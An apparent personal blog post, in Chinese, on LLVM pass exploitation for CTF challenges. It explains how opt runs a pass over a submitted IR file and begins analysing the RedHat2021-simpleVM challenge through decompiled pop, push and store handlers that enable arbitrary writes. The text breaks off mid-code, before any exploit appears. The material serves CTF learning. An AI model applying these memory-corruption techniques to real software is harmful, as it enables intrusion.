<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta property="og:type" content="website">
<meta property="og:title" content="PIG-007">
<meta property="og:url" content="http://pig-007.github.io/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="PIG-007">
<meta name="twitter:card" content="summary"><title>PIG-007</title><link ref="canonical" href="http://pig-007.github.io/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/09/07/LLVM%E5%AD%A6%E4%B9%A0/">LLVM学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-09-07</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="前置知识"   >
          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1>
      <p>从<code>CTF</code>角度来说，会给出一个运行程序<code>opt</code>和一个库<code>xx.so</code>，然后做题需要提供一个<code>exp.ll</code>，传递给<code>opt</code>。这个<code>exp.ll</code>是通过<code>exp.c</code>进行中间表达式生成的，是<code>exp.c</code>在程序中的一个比较直观的结构，类似如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">char</span> name[<span class="number">0x10</span>];</span><br><span class="line">   read(<span class="number">0</span>,name,<span class="number">0x10</span>);</span><br><span class="line">   write(<span class="number">1</span>,name,<span class="number">0x10</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;bye\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>使用命令<code>clang -emit-llvm -S exp.c -o exp.ll</code>得到如下的<code>exp.ll</code>直观的程序中间结构表达式</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = <span class="string">&#x27;main.c&#x27;</span></span><br><span class="line">source_filename = <span class="string">&quot;main.c&quot;</span></span><br><span class="line">target datalayout = <span class="string">&quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span></span><br><span class="line">target triple = <span class="string">&quot;x86_64-pc-linux-gnu&quot;</span></span><br><span class="line"></span><br><span class="line">@.str = <span class="keyword">private</span> unnamed_addr constant [<span class="number">5</span> x i8] c<span class="string">&quot;bye\0A\00&quot;</span>, align <span class="number">1</span></span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i32 @main() #<span class="number">0</span> &#123;</span><br><span class="line">  %<span class="number">1</span> = alloca [<span class="number">16</span> x i8], align <span class="number">16</span></span><br><span class="line">  %<span class="number">2</span> = getelementptr inbounds [<span class="number">16</span> x i8], [<span class="number">16</span> x i8]* %<span class="number">1</span>, i64 <span class="number">0</span>, i64 <span class="number">0</span></span><br><span class="line">  %<span class="number">3</span> = call i64 @read(i32 <span class="number">0</span>, i8* %<span class="number">2</span>, i64 <span class="number">16</span>)</span><br><span class="line">  %<span class="number">4</span> = getelementptr inbounds [<span class="number">16</span> x i8], [<span class="number">16</span> x i8]* %<span class="number">1</span>, i64 <span class="number">0</span>, i64 <span class="number">0</span></span><br><span class="line">  %<span class="number">5</span> = call i64 @write(i32 <span class="number">1</span>, i8* %<span class="number">4</span>, i64 <span class="number">16</span>)</span><br><span class="line">  %<span class="number">6</span> = call i32 (i8*, ...) @<span class="built_in">printf</span>(i8* getelementptr inbounds ([<span class="number">5</span> x i8], [<span class="number">5</span> x i8]* @.str, i64 <span class="number">0</span>, i64 <span class="number">0</span>))</span><br><span class="line">  ret i32 <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare dso_local i64 @read(i32, i8*, i64) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line">declare dso_local i64 @write(i32, i8*, i64) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line">declare dso_local i32 @<span class="built_in">printf</span>(i8*, ...) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line">attributes #<span class="number">0</span> = &#123; noinline nounwind optnone uwtable <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;frame-pointer&quot;</span>=<span class="string">&quot;all&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;min-legal-vector-width&quot;</span>=<span class="string">&quot;0&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-jump-tables&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line">attributes #<span class="number">1</span> = &#123; <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;frame-pointer&quot;</span>=<span class="string">&quot;all&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">!llvm.<span class="keyword">module</span>.flags = !&#123;!<span class="number">0</span>&#125;</span><br><span class="line">!llvm.ident = !&#123;!<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">!<span class="number">0</span> = !&#123;i32 <span class="number">1</span>, !<span class="string">&quot;wchar_size&quot;</span>, i32 <span class="number">4</span>&#125;</span><br><span class="line">!<span class="number">1</span> = !&#123;!<span class="string">&quot;clang version 10.0.0-4ubuntu1 &quot;</span>&#125;</span><br></pre></td></tr></table></div></figure>

<p><code>opt</code>在运行时，加载<code>xx.so</code>，而<code>xx.so</code>的<code>runOnFunction</code>函数会对<code>exp.ll</code>中的函数进行一个对应的解析操作。比如遍历<code>exp.ll</code>中的函数，如果调用了<code>add</code>函数，就获取<code>add</code>函数的第一个参数<code>a1</code>，依据<code>a1</code>的值对全局变量<code>p</code>指针进行加操作，其他的依据<code>write</code>函数什么的进行写操作从而造成任意写漏洞等等。</p>
<p>具体的可以看：[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_9" >原创] LLVM PASS PWN 总结-Pwn-看雪-安全社区|安全招聘|kanxue.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="题目"   >
          <a href="#题目" class="heading-link"><i class="fas fa-link"></i></a><a href="#题目" class="headerlink" title="题目"></a>题目</h1>
      
        <h2 id="RedHat2021-simpleVM"   >
          <a href="#RedHat2021-simpleVM" class="heading-link"><i class="fas fa-link"></i></a><a href="#RedHat2021-simpleVM" class="headerlink" title="RedHat2021-simpleVM"></a>RedHat2021-simpleVM</h2>
      
        <h3 id="漏洞分析"   >
          <a href="#漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3>
      <p>分析<code>VMPass.so</code>，<code>Alt+T</code>搜索一下<code>vtable</code>，找到最后一个函数即为<code>runOnFunction</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230828105741726.png" alt="image-20230828105741726"></p>
<p>进入查看进行分析，如果有函数<code>o0o0o0o0</code>，则进入<code>sub_6AC0</code>进行处理</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230828105832996.png" alt="image-20230828105832996"></p>
<p>然后在<code>sub_6AC0</code>函数中在进行循环分析，对每个基本块进行了遍历处理，处理函数为<code>sub_6B80</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230828110053292.png" alt="image-20230828110053292"></p>
<p>进入<code>sub_6B80</code>函数，大致分析一下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6B80</span><span class="params">(__int64 a1, llvm::BasicBlock *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  llvm::Value *CalledFunction; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> **v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> **v4; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v6; <span class="comment">// [rsp+18h] [rbp-1B8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+20h] [rbp-1B0h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-1A8h]</span></span><br><span class="line">  llvm::ConstantInt *v9; <span class="comment">// [rsp+30h] [rbp-1A0h]</span></span><br><span class="line">  _QWORD *v10; <span class="comment">// [rsp+38h] [rbp-198h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+40h] [rbp-190h]</span></span><br><span class="line">  llvm::ConstantInt *v12; <span class="comment">// [rsp+50h] [rbp-180h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+58h] [rbp-178h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+60h] [rbp-170h]</span></span><br><span class="line">  llvm::ConstantInt *v15; <span class="comment">// [rsp+68h] [rbp-168h]</span></span><br><span class="line">  _QWORD *v16; <span class="comment">// [rsp+70h] [rbp-160h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+78h] [rbp-158h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+A0h] [rbp-130h]</span></span><br><span class="line">  llvm::ConstantInt *v19; <span class="comment">// [rsp+A8h] [rbp-128h]</span></span><br><span class="line">  <span class="keyword">void</span> *v20; <span class="comment">// [rsp+B0h] [rbp-120h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+B8h] [rbp-118h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+E0h] [rbp-F0h]</span></span><br><span class="line">  llvm::ConstantInt *v23; <span class="comment">// [rsp+E8h] [rbp-E8h]</span></span><br><span class="line">  <span class="keyword">void</span> *v24; <span class="comment">// [rsp+F0h] [rbp-E0h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+F8h] [rbp-D8h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+110h] [rbp-C0h]</span></span><br><span class="line">  llvm::ConstantInt *v27; <span class="comment">// [rsp+118h] [rbp-B8h]</span></span><br><span class="line">  _QWORD *v28; <span class="comment">// [rsp+120h] [rbp-B0h]</span></span><br><span class="line">  __int64 v29; <span class="comment">// [rsp+128h] [rbp-A8h]</span></span><br><span class="line">  __int64 ZExtValue; <span class="comment">// [rsp+140h] [rbp-90h]</span></span><br><span class="line">  llvm::ConstantInt *v31; <span class="comment">// [rsp+148h] [rbp-88h]</span></span><br><span class="line">  _QWORD *v32; <span class="comment">// [rsp+150h] [rbp-80h]</span></span><br><span class="line">  __int64 ArgOperand; <span class="comment">// [rsp+158h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> *s1; <span class="comment">// [rsp+168h] [rbp-68h]</span></span><br><span class="line">  llvm::CallBase *v35; <span class="comment">// [rsp+170h] [rbp-60h]</span></span><br><span class="line">  llvm::Instruction *v36; <span class="comment">// [rsp+180h] [rbp-50h]</span></span><br><span class="line">  _QWORD *Name; <span class="comment">// [rsp+1A8h] [rbp-28h]</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp+1B8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v39[<span class="number">2</span>]; <span class="comment">// [rsp+1C0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v39[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v39[<span class="number">0</span>] = llvm::BasicBlock::begin(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v38 = llvm::BasicBlock::end(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v39, &amp;v38) &amp; <span class="number">1</span>) == <span class="number">0</span> )<span class="comment">//基本是固定的LLVM遍历套路</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="keyword">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;(v39);</span><br><span class="line">      <span class="comment">//这里的55即操作码,查询对应文档为PHINode操作码，不是很懂这个</span></span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::Instruction::getOpcode(v36) == <span class="number">55</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//获取指令</span></span><br><span class="line">      v35 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br><span class="line">      <span class="keyword">if</span> ( v35 )</span><br><span class="line">      &#123;</span><br><span class="line">        s1 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">          <span class="comment">//获取函数名称</span></span><br><span class="line">        CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(v35);</span><br><span class="line">        Name = (_QWORD *)llvm::Value::getName(CalledFunction);</span><br><span class="line">        *(_QWORD *)s1 = *Name;</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">1</span>) = Name[<span class="number">1</span>];</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">2</span>) = Name[<span class="number">2</span>];</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">3</span>) = Name[<span class="number">3</span>];</span><br><span class="line">          <span class="comment">//处理pop函数</span></span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;pop&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">         <span class="comment">//如果函数参数是2，这里把pop函数名称本身当作了一个参数，所以实际上pop函数应该只有一个参数</span></span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="comment">//获取pop函数的第一个参数</span></span><br><span class="line">            ArgOperand = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            v32 = <span class="number">0LL</span>;</span><br><span class="line">            v31 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand);</span><br><span class="line">            <span class="keyword">if</span> ( v31 )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//解析参数值</span></span><br><span class="line">              ZExtValue = llvm::ConstantInt::getZExtValue(v31);</span><br><span class="line">              <span class="keyword">if</span> ( ZExtValue == <span class="number">1</span> )</span><br><span class="line">                v32 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( ZExtValue == <span class="number">2</span> )</span><br><span class="line">                v32 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">              <span class="comment">//做一些操作，实际调试一下就行</span></span><br><span class="line">            <span class="keyword">if</span> ( v32 )</span><br><span class="line">            &#123;</span><br><span class="line">              v3 = off_20DFD8;</span><br><span class="line">              *v32 = *(_QWORD *)*off_20DFD8;</span><br><span class="line">              *v3 = (<span class="keyword">char</span> *)*v3 - <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="comment">//和pop类似</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;push&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v29 = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            v28 = <span class="number">0LL</span>;</span><br><span class="line">            v27 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v29);</span><br><span class="line">            <span class="keyword">if</span> ( v27 )</span><br><span class="line">            &#123;</span><br><span class="line">              v26 = llvm::ConstantInt::getZExtValue(v27);</span><br><span class="line">              <span class="keyword">if</span> ( v26 == <span class="number">1</span> )</span><br><span class="line">                v28 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v26 == <span class="number">2</span> )</span><br><span class="line">                v28 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v28 )</span><br><span class="line">            &#123;</span><br><span class="line">              v4 = off_20DFD8;</span><br><span class="line">              *off_20DFD8 = (<span class="keyword">char</span> *)*off_20DFD8 + <span class="number">8</span>;</span><br><span class="line">              *(_QWORD *)*v4 = *v28;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="comment">//1:**off_20DFD0 = *off_20DFC0</span></span><br><span class="line">          <span class="comment">//2:**off_20DFC0 = *off_20DFD0</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;store&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v25 = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            v24 = <span class="number">0LL</span>;</span><br><span class="line">            v23 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v25);</span><br><span class="line">            <span class="keyword">if</span> ( v23 )</span><br><span class="line">            &#123;</span><br><span class="line">              v22 = llvm::ConstantInt::getZExtValue(v23);</span><br><span class="line">              <span class="keyword">if</span> 